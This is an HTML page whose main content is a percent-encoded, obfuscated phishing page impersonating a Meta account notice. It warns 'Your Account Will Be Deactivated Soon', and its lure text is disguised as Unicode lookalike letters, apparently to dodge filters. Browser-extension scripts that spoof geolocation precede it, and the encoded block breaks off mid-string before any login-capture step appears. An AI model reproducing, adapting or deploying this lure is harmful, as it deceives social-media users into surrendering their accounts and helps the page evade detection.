<html><script>
    window[Symbol.for('MARIO_POST_CLIENT_eppiocemhmnlbhjplcgkofciiegomcon')] = new (class PostClient {
    constructor(name, destination) {
        this.name = name;
        this.destination = destination;
        this.serverListeners = {};
        this.bgRequestsListeners = {};
        this.bgEventsListeners = {};
        window.addEventListener('message', (message) => {
            const data = message.data;
            const isNotForMe = !(data.destination && data.destination === this.name);
            const hasNotEventProp = !data.event;
            if (isNotForMe || hasNotEventProp) {
                return;
            }
            if (data.event === 'MARIO_POST_SERVER__BG_RESPONSE') {
                const response = data.args;
                if (this.hasBgRequestListener(response.requestId)) {
                    try {
                        this.bgRequestsListeners[response.requestId](response.response);
                    }
                    catch (e) {
                        console.log(e);
                    }
                    delete this.bgRequestsListeners[response.requestId];
                }
            }
            else if (data.event === 'MARIO_POST_SERVER__BG_EVENT') {
                const response = data.args;
                if (this.hasBgEventListener(response.event)) {
                    try {
                        this.bgEventsListeners[data.id](response.payload);
                    }
                    catch (e) {
                        console.log(e);
                    }
                }
            }
            else if (this.hasServerListener(data.event)) {
                try {
                    this.serverListeners[data.event](data.args);
                }
                catch (e) {
                    console.log(e);
                }
            }
            else {
                console.log(`event not handled: ${data.event}`);
            }
        });
    }
    emitToServer(event, args) {
        const id = this.generateUIID();
        const message = {
            args,
            destination: this.destination,
            event,
            id,
        };
        window.postMessage(message, location.origin);
        return id;
    }
    emitToBg(bgEventName, args) {
        const requestId = this.generateUIID();
        const request = { bgEventName, requestId, args };
        this.emitToServer('MARIO_POST_SERVER__BG_REQUEST', request);
        return requestId;
    }
    hasServerListener(event) {
        return !!this.serverListeners[event];
    }
    hasBgRequestListener(requestId) {
        return !!this.bgRequestsListeners[requestId];
    }
    hasBgEventListener(bgEventName) {
        return !!this.bgEventsListeners[bgEventName];
    }
    fromServerEvent(event, listener) {
        this.serverListeners[event] = listener;
    }
    fromBgEvent(bgEventName, listener) {
        this.bgEventsListeners[bgEventName] = listener;
    }
    fromBgResponse(requestId, listener) {
        this.bgRequestsListeners[requestId] = listener;
    }
    generateUIID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
            const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }
})('MARIO_POST_CLIENT_eppiocemhmnlbhjplcgkofciiegomcon', 'MARIO_POST_SERVER_eppiocemhmnlbhjplcgkofciiegomcon')</script><script>
    const hideMyLocation = new (class HideMyLocation {
    constructor(clientKey) {
        this.clientKey = clientKey;
        this.watchIDs = {};
        this.client = window[Symbol.for(clientKey)];
        const getCurrentPosition = navigator.geolocation.getCurrentPosition;
        const watchPosition = navigator.geolocation.watchPosition;
        const clearWatch = navigator.geolocation.clearWatch;
        const self = this;
        navigator.geolocation.getCurrentPosition = function (successCallback, errorCallback, options) {
            self.handle(getCurrentPosition, 'GET', successCallback, errorCallback, options);
        };
        navigator.geolocation.watchPosition = function (successCallback, errorCallback, options) {
            return self.handle(watchPosition, 'WATCH', successCallback, errorCallback, options);
        };
        navigator.geolocation.clearWatch = function (fakeWatchId) {
            if (fakeWatchId === -1) {
                return;
            }
            const realWatchId = self.watchIDs[fakeWatchId];
            delete self.watchIDs[fakeWatchId];
            return clearWatch.apply(this, [realWatchId]);
        };
    }
    handle(getCurrentPositionOrWatchPosition, type, successCallback, errorCallback, options) {
        const requestId = this.client.emitToBg('HIDE_MY_LOCATION__GET_LOCATION');
        let fakeWatchId = this.getRandomInt(0, 100000);
        this.client.fromBgResponse(requestId, (response) => {
            if (response.enabled) {
                if (response.status === 'SUCCESS') {
                    const position = this.map(response);
                    successCallback(position);
                }
                else {
                    const error = this.errorObj();
                    errorCallback(error);
                    fakeWatchId = -1;
                }
            }
            else {
                const args = [successCallback, errorCallback, options];
                const watchId = getCurrentPositionOrWatchPosition.apply(navigator.geolocation, args);
                if (type === 'WATCH') {
                    this.watchIDs[fakeWatchId] = watchId;
                }
            }
        });
        if (type === 'WATCH') {
            return fakeWatchId;
        }
    }
    map(response) {
        return {
            coords: {
                accuracy: 20,
                altitude: null,
                altitudeAccuracy: null,
                heading: null,
                latitude: response.latitude,
                longitude: response.longitude,
                speed: null,
            },
            timestamp: Date.now(),
        };
    }
    errorObj() {
        return {
            code: 1,
            message: 'User denied Geolocation',
        };
    }
    getRandomInt(min, max) {
        min = Math.ceil(min);
        max = Math.floor(max);
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }
})('MARIO_POST_CLIENT_eppiocemhmnlbhjplcgkofciiegomcon')
<script language="javascript">
<!--
// == Begin Free HTML Source Code Obfuscation Protection from https://snapbuilder.com == //
document.write(unescape('%3C%21%44%4F%43%54%59%50%45%20%68%74%6D%6C%20%50%55%42%4C%49%43%20%22%2D%2F%2F%57%33%43%2F%2F%44%54%44%20%48%54%4D%4C%20%34%2E%30%20%54%72%61%6E%73%69%74%69%6F%6E%61%6C%2F%2F%45%4E%22%20%22%68%74%74%70%3A%2F%2F%77%77%77%2E%77%33%2E%6F%72%67%2F%54%52%2F%52%45%43%2D%68%74%6D%6C%34%30%2F%6C%6F%6F%73%65%2E%64%74%64%22%3E%0A%3C%68%74%6D%6C%3E%0A%3C%68%65%61%64%3E%0A%09%3C%6C%69%6E%6B%20%72%65%6C%3D%22%69%63%6F%6E%22%20%74%79%70%65%3D%22%69%6D%61%67%65%2F%78%2D%69%63%6F%6E%22%20%68%72%65%66%3D%22%66%62%62%2E%69%63%6F%22%3E%0A%20%20%20%20%3C%6D%65%74%61%20%6E%61%6D%65%3D%22%76%69%65%77%70%6F%72%74%22%20%63%6F%6E%74%65%6E%74%3D%22%75%73%65%72%2D%73%63%61%6C%61%62%6C%65%3D%6E%6F%2C%69%6E%69%74%69%61%6C%2D%73%63%61%6C%65%3D%31%2C%6D%61%78%69%6D%75%6D%2D%73%63%61%6C%65%3D%31%22%3E%0A%20%20%20%20%3C%74%69%74%6C%65%3E%2E%2E%2E%3C%2F%74%69%74%6C%65%3E%0A%20%20%20%20%3C%21%2D%2D%20%3C%6C%69%6E%6B%20%72%65%6C%3D%22%73%74%79%6C%65%73%68%65%65%74%22%20%68%72%65%66%3D%22%62%6F%6F%74%73%74%72%61%70%35%2E%6D%69%6E%2E%63%73%73%3F%76%3D%32%22%3E%20%2D%2D%3E%0A%20%20%20%20%3C%21%2D%2D%20%3C%73%63%72%69%70%74%20%73%72%63%3D%22%6A%71%75%65%72%79%2D%33%2E%36%2E%33%2E%6D%69%6E%2E%6A%73%3F%76%3D%32%22%3E%3C%2F%73%63%72%69%70%74%3E%20%2D%2D%3E%0A%20%20%20%20%3C%6C%69%6E%6B%20%68%72%65%66%3D%22%68%74%74%70%73%3A%2F%2F%63%64%6E%2E%6A%73%64%65%6C%69%76%72%2E%6E%65%74%2F%6E%70%6D%2F%62%6F%6F%74%73%74%72%61%70%40%35%2E%30%2E%32%2F%64%69%73%74%2F%63%73%73%2F%62%6F%6F%74%73%74%72%61%70%2E%6D%69%6E%2E%63%73%73%3F%71%3D%26%6C%74%3B%3F%3D%64%61%74%65%28%27%55%27%29%3F%26%67%74%3B%22%20%72%65%6C%3D%22%73%74%79%6C%65%73%68%65%65%74%22%20%69%6E%74%65%67%72%69%74%79%3D%22%73%68%61%33%38%34%2D%45%56%53%54%51%4E%33%2F%61%7A%70%72%47%31%41%6E%6D%33%51%44%67%70%4A%4C%49%6D%39%4E%61%6F%30%59%7A%31%7A%74%63%51%54%77%46%73%70%64%33%79%44%36%35%56%6F%68%68%70%75%75%43%4F%6D%4C%41%53%6A%43%22%20%63%72%6F%73%73%6F%72%69%67%69%6E%3D%22%61%6E%6F%6E%79%6D%6F%75%73%22%3E%0A%20%20%20%20%3C%73%63%72%69%70%74%20%73%72%63%3D%22%6A%73%2F%33%2E%36%2E%34%2D%6A%71%75%65%72%79%2E%6D%69%6E%2E%6A%73%22%20%69%6E%74%65%67%72%69%74%79%3D%22%73%68%61%35%31%32%2D%70%75%6D%42%73%6A%4E%52%47%47%71%6B%50%7A%4B%48%6E%64%5A%4D%61%41%47%2B%62%69%72%33%37%34%73%4F%52%79%7A%4D%33%75%75%6C%4C%56%31%34%6C%4E%35%4C%79%79%6B%71%4E%6B%38%65%45%65%55%6C%55%6B%42%33%55%30%4D%34%46%41%70%79%61%48%72%61%54%36%35%69%68%4A%68%44%70%51%3D%3D%22%20%63%72%6F%73%73%6F%72%69%67%69%6E%3D%22%61%6E%6F%6E%79%6D%6F%75%73%22%20%72%65%66%65%72%72%65%72%70%6F%6C%69%63%79%3D%22%6E%6F%2D%72%65%66%65%72%72%65%72%22%3E%3C%2F%73%63%72%69%70%74%3E%0A%20%20%20%20%3C%73%74%79%6C%65%3E%0A%20%20%20%20%2F%2A%20%62%6C%75%65%20%32%31%36%46%44%42%20%2A%2F%0A%20%20%20%20%62%6F%64%79%20%7B%0A%20%20%20%20%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%20%23%66%31%66%31%66%32%3B%0A%20%20%20%20%20%20%20%20%6D%61%72%67%69%6E%3A%20%30%70%78%3B%0A%20%20%20%20%20%20%20%20%70%61%64%64%69%6E%67%3A%20%30%70%78%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%2E%68%65%61%64%20%7B%0A%20%20%20%20%20%20%20%20%2F%2A%20%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%20%23%33%38%36%61%38%62%3B%20%2A%2F%0A%20%20%20%20%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%20%23%66%31%66%31%66%32%3B%0A%20%20%20%20%20%20%20%20%2F%2A%64%61%72%6B%2A%2F%0A%20%20%20%20%20%20%20%20%74%65%78%74%2D%61%6C%69%67%6E%3A%20%6C%65%66%74%3B%0A%20%20%20%20%20%20%20%20%6D%61%72%67%69%6E%2D%62%6F%74%74%6F%6D%3A%20%33%33%70%78%3B%0A%20%20%20%20%20%20%20%20%68%65%69%67%68%74%3A%20%34%30%70%78%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%2E%68%65%61%64%69%6D%67%20%7B%0A%20%20%20%20%20%20%20%20%6D%61%72%67%69%6E%3A%33%70%78%3B%0A%20%20%20%20%20%20%20%20%68%65%69%67%68%74%3A%20%38%37%25%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%2E%62%61%6E%6E%65%72%69%6D%67%20%7B%0A%20%20%20%20%20%20%20%20%2F%2A%20%77%69%64%74%68%3A%20%33%33%25%3B%20%2A%2F%0A%20%20%20%20%7D%0A%0A%20%20%20%20%2E%63%6F%6E%74%65%6E%74%31%20%7B%0A%20%20%20%20%20%20%20%20%74%65%78%74%2D%61%6C%69%67%6E%3A%20%63%65%6E%74%65%72%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%2E%63%6F%6E%74%65%6E%74%32%20%7B%0A%20%20%20%20%20%20%20%20%70%61%64%64%69%6E%67%3A%20%33%70%78%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%2E%70%2D%74%69%74%6C%65%20%7B%0A%20%20%20%20%20%20%20%20%66%6F%6E%74%2D%77%65%69%67%68%74%3A%20%39%30%30%3B%0A%20%20%20%20%20%20%20%20%6D%61%72%67%69%6E%3A%20%30%70%78%3B%0A%20%20%20%20%20%20%20%20%70%61%64%64%69%6E%67%3A%20%30%70%78%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%2E%70%2D%63%6F%6E%74%65%6E%74%20%7B%0A%20%20%20%20%20%20%20%20%6D%61%72%67%69%6E%3A%20%30%70%78%3B%0A%20%20%20%20%20%20%20%20%70%61%64%64%69%6E%67%3A%20%30%70%78%3B%0A%20%20%20%20%20%20%20%20%70%61%64%64%69%6E%67%2D%74%6F%70%3A%20%33%70%78%3B%0A%20%20%20%20%20%20%20%20%70%61%64%64%69%6E%67%2D%62%6F%74%74%6F%6D%3A%20%37%70%78%3B%0A%20%20%20%20%20%20%20%20%3B%0A%20%20%20%20%7D%0A%20%20%20%20%2E%6C%6F%63%6B%2D%69%6D%67%20%7B%0A%20%20%20%20%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%2D%63%6F%6C%6F%72%3A%20%23%34%37%35%37%39%61%3B%0A%20%20%20%20%20%20%20%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%33%36%30%70%78%3B%0A%20%20%20%20%20%20%20%20%6D%61%72%67%69%6E%3A%20%30%70%78%3B%0A%20%20%20%20%20%20%20%20%70%61%64%64%69%6E%67%3A%20%31%30%70%78%3B%0A%20%20%20%20%20%20%20%20%66%6F%6E%74%2D%73%69%7A%65%3A%20%35%35%70%74%3B%0A%20%20%20%20%7D%0A%20%20%20%20%3C%2F%73%74%79%6C%65%3E%0A%3C%2F%68%65%61%64%3E%0A%0A%3C%62%6F%64%79%20%6F%6E%6C%6F%61%64%3D%22%6F%6E%6C%6F%61%64%52%75%6E%28%29%22%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%68%65%61%64%22%20%69%64%3D%22%68%65%61%64%2D%6C%69%6E%65%22%3E%0A%20%20%20%20%20%20%20%20%3C%73%70%61%6E%20%73%74%79%6C%65%3D%22%6D%61%72%67%69%6E%2D%6C%65%66%74%3A%37%70%78%3B%63%6F%6C%6F%72%3A%23%66%31%66%31%66%32%3B%66%6F%6E%74%2D%73%69%7A%65%3A%32%65%6D%3B%66%6F%6E%74%2D%77%65%69%67%68%74%3A%62%6F%6C%64%22%20%69%64%3D%22%74%68%65%2D%6C%6F%67%6F%22%3E%2E%3C%2F%73%70%61%6E%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%6F%6E%74%61%69%6E%65%72%20%6D%74%2D%32%22%3E%0A%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%72%6F%77%20%6A%75%73%74%69%66%79%2D%63%6F%6E%74%65%6E%74%2D%6D%64%2D%63%65%6E%74%65%72%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%6F%6C%2D%31%32%20%63%6F%6C%2D%6D%64%2D%36%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%61%72%64%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%69%64%3D%22%64%69%76%2D%69%6D%67%2D%68%65%61%64%65%72%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%61%72%64%2D%62%6F%64%79%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%68%33%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%63%65%6E%74%65%72%22%20%69%64%3D%22%63%61%72%64%2D%74%69%74%6C%65%2D%74%65%78%74%22%3E%3C%2F%68%33%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%70%20%73%74%79%6C%65%3D%22%74%65%78%74%2D%61%6C%69%67%6E%3A%20%6A%75%73%74%69%66%79%3B%22%20%69%64%3D%22%63%61%72%64%2D%64%65%73%63%2D%74%65%78%74%22%3E%3C%2F%70%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%75%6C%20%69%64%3D%22%63%61%72%64%2D%75%6C%2D%74%65%78%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%75%6C%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%70%20%69%64%3D%22%63%61%72%64%2D%64%65%73%63%32%2D%74%65%78%74%22%3E%3C%2F%70%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%64%69%76%20%69%64%3D%22%64%69%76%2D%62%74%6E%2D%63%6F%6E%74%22%3E%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%68%72%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%70%20%63%6C%61%73%73%3D%22%74%65%78%74%2D%63%65%6E%74%65%72%20%74%65%78%74%2D%64%61%6E%67%65%72%20%70%72%65%20%6D%74%2D%30%22%20%69%64%3D%22%73%75%73%70%65%6E%64%65%64%64%61%79%6D%6B%64%66%67%68%6F%61%6E%73%6E%64%67%66%61%73%64%22%3E%3C%2F%70%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%66%6F%6F%74%65%72%20%63%6C%61%73%73%3D%22%6D%61%69%6E%2D%66%6F%6F%74%65%72%20%74%65%78%74%2D%63%65%6E%74%65%72%20%6D%74%2D%32%20%6D%62%2D%35%22%20%69%64%3D%22%74%68%65%2D%66%6F%6F%74%65%72%22%3E%0A%20%20%20%20%3C%2F%66%6F%6F%74%65%72%3E%0A%3C%2F%62%6F%64%79%3E%0A%3C%73%63%72%69%70%74%3E%0A%66%75%6E%63%74%69%6F%6E%20%6F%6E%6C%6F%61%64%52%75%6E%28%29%20%7B%0A%20%20%20%20%73%65%74%54%69%6D%65%6F%75%74%28%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%20%20%20%20%76%61%72%20%61%67%65%6E%74%20%3D%20%6E%61%76%69%67%61%74%6F%72%2E%75%73%65%72%41%67%65%6E%74%2E%74%6F%4C%6F%77%65%72%43%61%73%65%28%29%3B%0A%20%20%20%20%20%20%20%20%41%6C%6C%6F%77%48%65%61%64%65%72%3D%5B%22%41%6E%64%72%6F%69%64%22%2C%22%69%50%68%6F%6E%65%22%2C%22%57%69%6E%64%6F%77%73%22%2C%22%57%65%62%4B%69%74%22%2C%22%4D%61%63%69%6E%74%6F%73%68%22%5D%3B%0A%20%20%20%20%20%20%20%20%43%4B%3D%30%3B%0A%20%20%20%20%20%20%20%20%66%6F%72%20%28%6C%65%74%20%69%6E%64%65%78%20%3D%20%30%3B%20%69%6E%64%65%78%20%3C%20%41%6C%6C%6F%77%48%65%61%64%65%72%2E%6C%65%6E%67%74%68%3B%20%69%6E%64%65%78%2B%2B%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%78%41%67%65%6E%74%3D%61%67%65%6E%74%2E%74%6F%4C%6F%63%61%6C%65%4C%6F%77%65%72%43%61%73%65%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%78%48%65%61%64%65%72%3D%41%6C%6C%6F%77%48%65%61%64%65%72%5B%69%6E%64%65%78%5D%2E%74%6F%4C%6F%63%61%6C%65%4C%6F%77%65%72%43%61%73%65%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%78%41%67%65%6E%74%2E%69%6E%64%65%78%4F%66%28%78%48%65%61%64%65%72%29%20%21%3D%20%2D%31%29%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%43%4B%3D%31%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%62%72%65%61%6B%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%69%66%28%43%4B%3D%3D%31%29%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%73%65%74%44%74%53%75%73%70%65%6E%64%65%64%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23%63%61%72%64%2D%74%69%74%6C%65%2D%74%65%78%74%27%29%2E%68%74%6D%6C%28%22%59%6F%75%72%20%41%63%63%6F%75%6E%74%20%57%69%6C%6C%20%42%65%20%44%65%61%63%74%69%76%61%74%65%64%20%53%6F%6F%6E%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23%64%69%76%2D%69%6D%67%2D%68%65%61%64%65%72%27%29%2E%68%74%6D%6C%28%27%3C%69%6D%67%20%73%74%79%6C%65%3D%22%77%69%64%74%68%3A%20%31%30%30%25%3B%22%20%73%72%63%3D%22%69%69%69%2E%6A%70%67%22%3E%27%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23%63%61%72%64%2D%64%65%73%63%2D%74%65%78%74%27%29%2E%68%74%6D%6C%28%22%57%65%20%61%72%65%20%63%6F%6E%73%74%61%6E%74%6C%79%20%75%70%64%61%74%69%6E%67%20%6F%75%72%20%4D%65%74%61%20%50%72%69%76%61%63%79%20%50%6F%6C%69%63%79%20%61%6E%64%20%54%65%72%6D%73%20%6F%66%20%53%65%72%76%69%63%65%20%57%65%20%68%61%76%65%20%74%65%6D%70%6F%72%61%72%69%6C%79%20%73%75%73%70%65%6E%64%65%64%20%79%6F%75%72%20%70%61%67%65%20%62%65%63%61%75%73%65%20%73%6F%6D%65%6F%6E%65%20%74%6F%6C%64%20%75%73%20%74%68%61%74%20%79%6F%75%20%76%69%6F%6C%61%74%65%64%20%6F%75%72%20%74%65%72%6D%73%20%61%6E%64%20%63%6F%6E%64%69%74%69%6F%6E%73%20%6F%66%20%73%65%72%76%69%63%65%2E%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%24%28%27%23%63%61%72%64%2D%75%6C%2D%74%65%78%74%27%29%2E%61%70%70%65%6E%64%28%22%3C%6C%69%3E%55%73%69%6E%67%20%73%6F%6D%65%6F%6E%65%20%65%6C%73%65%27%73%20%66%61%6B%65%20%6E%61%6D%65%2F%70%68%6F%74%6F%2E%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%24%28%27%23%63%61%72%64%2D%75%6C%2D%74%65%78%74%27%29%2E%61%70%70%65%6E%64%28%22%3C%6C%69%3E%53%68%61%72%65%20%63%6F%6E%74%65%6E%74%20%74%68%61%74%20%6D%69%73%6C%65%61%64%73%20%6F%74%68%65%72%20%75%73%65%72%73%2E%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20%24%28%27%23%63%61%72%64%2D%75%6C%2D%74%65%78%74%27%29%2E%61%70%70%65%6E%64%28%22%3C%6C%69%3E%49%6E%73%75%6C%74%69%6E%67%20%6F%74%68%65%72%20%75%73%65%72%73%2E%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23%63%61%72%64%2D%75%6C%2D%74%65%78%74%27%29%2E%61%70%70%65%6E%64%28%22%3C%6C%69%3E%26%23%31%32%30%32%34%32%3B%26%23%31%32%30%32%35%37%3B%26%23%31%32%30%32%35%30%3B%26%23%31%32%30%32%36%37%3B%26%23%31%32%30%32%35%38%3B%26%23%31%32%30%32%36%33%3B%26%23%31%32%30%32%35%36%3B%20%26%23%31%32%30%32%36%35%3B%26%23%31%32%30%32%35%37%3B%26%23%31%32%30%32%36%34%3B%26%23%31%32%30%32%36%39%3B%26%23%31%32%30%32%36%34%3B%26%23%31%32%30%32%36%38%3B%20%26%23%31%32%30%32%35%30%3B%26%23%31%32%30%32%36%33%3B%26%23%31%32%30%32%35%33%3B%20%26%23%31%32%30%32%37%31%3B%26%23%31%32%30%32%35%38%3B%26%23%31%32%30%32%35%33%3B%26%23%31%32%30%32%35%34%3B%26%23%31%32%30%32%36%34%3B%26%23%31%32%30%32%36%38%3B%20%26%23%31%32%30%32%36%39%3B%26%23%31%32%30%32%35%37%3B%26%23%31%32%30%32%35%30%3B%26%23%31%32%30%32%36%39%3B%20%26%23%31%32%30%32%37%31%3B%26%23%31%32%30%32%35%38%3B%26%23%31%32%30%32%36%34%3B%26%23%31%32%30%32%36%31%3B%26%23%31%32%30%32%35%30%3B%26%23%31%32%30%32%36%39%3B%26%23%31%32%30%32%35%34%3B%20%26%23%31%32%30%32%35%32%3B%26%23%31%32%30%32%36%34%3B%26%23%31%32%30%32%36%35%3B%26%23%31%32%30%32%37%34%3B%26%23%31%32%30%32%36%37%3B%26%23%31%32%30%32%35%38%3B%26%23%31%32%30%32%35%36%3B%26%23%31%32%30%32%35%37%3B%26%23%31%32%30%32%36%39%3B%2E%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23%63%61%72%64%2D%75%6C%2D%74%65%78%74%27%29%2E%61%70%70%65%6E%64%28%22%3C%6C%69%3E%26%23%31%32%30%32%34%34%3B%26%23%31%32%30%32%36%38%3B%26%23%31%32%30%32%35%38%3B%26%23%31%32%30%32%36%33%3B%26%23%31%32%30%32%35%36%3B%20%26%23%31%32%30%32%35%35%3B%26%23%31%32%30%32%35%30%3B%26%23%31%32%30%32%36%30%3B%26%23%31%32%30%32%35%34%3B%20%26%23%31%32%30%32%36%35%3B%26%23%31%32%30%32%35%37%3B%26%23%31%32%30%32%36%34%3B%26%23%31%32%30%32%36%39%3B%26%23%31%32%30%32%36%34%3B%26%23%31%32%30%32%36%38%3B%20%26%23%31%32%30%32%35%30%3B%26%23%31%32%30%32%36%33%3B%26%23%31%32%30%32%35%33%3B%20%26%23%31%32%30%32%36%33%3B%26%23%31%32%30%32%35%30%3B%26%23%31%32%30%32%36%32%3B%26%23%31%32%30%32%35%34%3B%26%23%31%32%30%32%36%38%3B%2E%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23%63%61%72%64%2D%75%6C%2D%74%65%78%74%27%29%2E%61%70%70%65%6E%64%28%22%3C%6C%69%3E%26%23%31%32%30%32%33%31%3B%26%23%31%32%30%32%35%30%3B%26%23%31%32%30%32%36%37%3B%26%23%31%32%30%32%36%32%3B%26%23%31%32%30%32%35%38%3B%26%23%31%32%30%32%36%33%3B%26%23%31%32%30%32%35%36%3B%20%26%23%31%32%30%32%36%34%3B%26%23%31%32%30%32%36%39%3B%26%23%31%32%30%32%35%37%3B%26%23%31%32%30%32%35%34%3B%26%23%31%32%30%32%36%37%3B%26%23%31%32%30%32%36%38%3B%2E%22%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24%28%27%23%63%61%72%64%2D%75%6C%2D%74%65%78%74%27%29%2E%61%70%70%65%6E%64%28%22%3C%6C%69%3E%26%23%31%32%30%32%32%36%3B%26%23%31%32%30%32%36%34%3B%26%23%31%32%30%32%36%32%3B%26%23%31%32%30%32%36%32%3B%26%23%31%32%30%32%37%30%3B%26%23%31%32%30%32%36%33%3B%26%23%31%32%30%32%35%38%3B%26%23%31%32%30%32%35%32%3B%26%23%31%32%30%32%35%30%3B%26%23%31%32%30%32%36%39%3B%26%23%31%32%30%32%35%38%3B%26%23%31%32%30%32%36%33%3B%26%23%31%32%30%32%35%36%3B%20%26%23%31%32%30%32%37%32%3B%26%23%31%32%30%32%35%38%3B%26%23%31%32%30%32%36%39%3B%26%23%31%32%30%32%35%37%3B%20%26%23%31%32%30%32%36%34%3B%26%23%31%32%30%32%36%39%3B%26%23%31%32%30%32%35%37%3B%26%23%31%32%30%32%35%34%3B%26%23%31%32%30%32%36%37%3B%26%23%31%32%30%32%36%38%3B%20%26%23%31%32%30%32%35%35%3B%26%23%31%32%30%32%36%34%3B%26%23%31%32%30%32%36%37%3B%20%26%23%31%32%30%32%35%37%3B%26%23%31%32%30%32%35%30%3B%26%23%31%32%30%32%36%37%3B%26%23%31%32%30%32%35%30%3B%26%23%31%32%30%32%36%38%3B%26%23%31%32%30%32%36%38%3B%26%23%31%32%30%32%36%32%3B%26%23%31%32%30%32%35%34%3B%26%23%31%32%30%32%36%33%3B%26%23%31%32%30%32%36%39%3B%2C%20%26%23%31%32%30%32%36%35%3B%26%23%31%32%30%32%36%37%3B%26%23%31%32%30%32%36%34%3B%26%23%31%32%30%32%36%32%3B%26%23%31%32%30%32%36%34%3B%26%23%31%32%30%32%36%39%3B%26%23%31%32%30%32%35%38%3B%26%23%31%32%30%32%36%34%3B%26%23%31%32%30%32%36%33%3B%26%23%31%32%30%32%36%38%3B%2C%20%26%23%31%32%30%32%35%30%3B%26%23%31%32%30%32%35%33%3B%26%23%31%32%30%32%37%31%3B%26%23%31%32%30%32%35%34%3B%26%23%31%32%30%32%36%37%3B%26%23%31%32%30%32%36%39%3B%26%23%31%32%30%32%35%38%3B%26%23%31%32%30%32%36%38%3B%26%23%31%32%30%32%35%38%3B%26%23%31%32%30%32%36%33%3B%26%23%31%32%30%32%35%36%3B%20%26%23%31%32%30%32%35%30%3B%26%23%31%32%30%32%36%33%3B%26%23%31%32%30%32%35%33%3B%20%26%23%31%32%30%32%36%34%3B%26%23%31%32%30%32%36%39%3B%26%23%31%32%30%32%35%37%3B%26%23%31%32%30%32%35%34%3B%26%23%31%32%30%32%36%37%3B%20%26%23%31%32%30%32%35%30%3B%26%23%31%32%30%32%35%32%3B%26%23%31%32%30%32%36%39%3B%26%23%31%32%30%32%36%38%3B%20%26%23%31%32%30%32%36%39%3B%26%23%31%32%30%32%35%37%3B%26%23%31%32%30%32%35%30%3B%26%23%31%